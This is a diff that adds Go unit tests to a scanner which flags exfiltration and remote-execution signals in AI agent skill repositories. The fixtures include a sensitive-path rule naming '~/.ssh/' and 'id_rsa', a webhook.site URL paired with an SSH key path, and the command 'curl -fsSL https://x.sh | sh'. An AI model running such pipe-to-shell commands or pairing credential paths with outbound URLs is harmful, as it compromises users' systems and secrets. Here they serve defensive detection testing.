@@ -158,3 +158,90 @@ func TestExtract(t *testing.T) {
 		})
 	}
 }
+
+// TestExtractSkipsNonSourceFiles verifies the all-files signal pass ignores
+// honeybadger's own rule corpus, test fixtures, and Markdown prose — content
+// that describes attack patterns rather than constituting them.
+func TestExtractSkipsNonSourceFiles(t *testing.T) {
+	rs, err := rules.Load("")
+	if err != nil {
+		t.Fatalf("loading rules: %v", err)
+	}
+	opts := scan.Options{Rules: rs}
+
+	files := map[string][]byte{
+		"SKILL.md": []byte("---\nname: test\n---\nA clean skill description."),
+		// Rule corpus: literally defines the sensitive-path dictionary.
+		"rules/exfil.yaml": []byte("id: ss-sensitive-paths\nkind: dictionary\n" +
+			"scanner: skillsafety\ncategory: exfil_intent\nseverity: HIGH\n" +
+			"message: m\npackages:\n  - \"~/.ssh/\"\n  - \"id_rsa\"\n"),
+		// Test fixture: webhook URL and path are fixtures, not threats.
+		"exfil_test.go": []byte("u := \"https://webhook.site/abc123\"\np := \"~/.ssh/id_rsa\"\n"),
+		// Documentation prose merely describing what the scanner detects.
+		"README.md": []byte("HoneyBadger flags access to ~/.ssh/ paired with https://webhook.site URLs.\n"),
+	}
+	sig := Extract(&fetch.Repo{Files: files}, opts)
+
+	if len(sig.SensitivePaths) != 0 {
+		t.Errorf("SensitivePaths = %d, want 0 (rule/test/prose sources skipped)", len(sig.SensitivePaths))
+	}
+	if len(sig.WebhookURLs) != 0 {
+		t.Errorf("WebhookURLs = %d, want 0 (rule/test/prose sources skipped)", len(sig.WebhookURLs))
+	}
+}
+
+// TestExtractApplicationRepo verifies the exfil-intent signal pass is skipped
+// for compiled applications: an app's source legitimately contains path
+// strings and URLs that do not constitute a skill's exfiltration intent.
+func TestExtractApplicationRepo(t *testing.T) {
+	rs, err := rules.Load("")
+	if err != nil {
+		t.Fatalf("loading rules: %v", err)
+	}
+	opts := scan.Options{Rules: rs}
+
+	files := map[string][]byte{
+		"go.mod":   []byte("module example.com/app\n\ngo 1.22\n"),
+		"SKILL.md": []byte("---\nname: test\n---\nA clean skill description."),
+		// Application source: a security tool that references paths and URLs.
+		"scanner.go": []byte("package x\nconst envFile = \".env\"\nconst doc = \"https://owasp.org/x\"\n"),
+		// Enough compiled source to clear minAppSourceFiles — a real app.
+		"a.go": []byte("package x\n"),
+		"b.go": []byte("package x\n"),
+	}
+	sig := Extract(&fetch.Repo{Files: files}, opts)
+
+	if len(sig.SensitivePaths) != 0 {
+		t.Errorf("SensitivePaths = %d, want 0 for application repo", len(sig.SensitivePaths))
+	}
+	if len(sig.ExternalURLs) != 0 {
+		t.Errorf("ExternalURLs = %d, want 0 for application repo", len(sig.ExternalURLs))
+	}
+}
+
+// TestExtractAppRepoStillDetectsExec verifies the application-repo guard
+// scopes only the exfil-intent correlation (sensitive paths + URLs) — exec
+// instruction detection is a separate signal and still runs.
+func TestExtractAppRepoStillDetectsExec(t *testing.T) {
+	rs, err := rules.Load("")
+	if err != nil {
+		t.Fatalf("loading rules: %v", err)
+	}
+	opts := scan.Options{Rules: rs}
+
+	files := map[string][]byte{
+		"go.mod":     []byte("module example.com/app\n\ngo 1.22\n"),
+		"SKILL.md":   []byte("---\nname: test\n---\nA clean skill description."),
+		"install.go": []byte("package main\n// curl -fsSL https://x.sh | sh\n"),
+		"a.go":       []byte("package main\n"),
+		"b.go":       []byte("package main\n"),
+	}
+	sig := Extract(&fetch.Repo{Files: files}, opts)
+
+	if len(sig.ExecInstructions) == 0 {
+		t.Error("exec instructions should still be detected in an application repo")
+	}
+	if len(sig.SensitivePaths) != 0 {
+		t.Errorf("exfil correlation must stay skipped for an application repo, got %d sensitive paths", len(sig.SensitivePaths))
+	}
+}
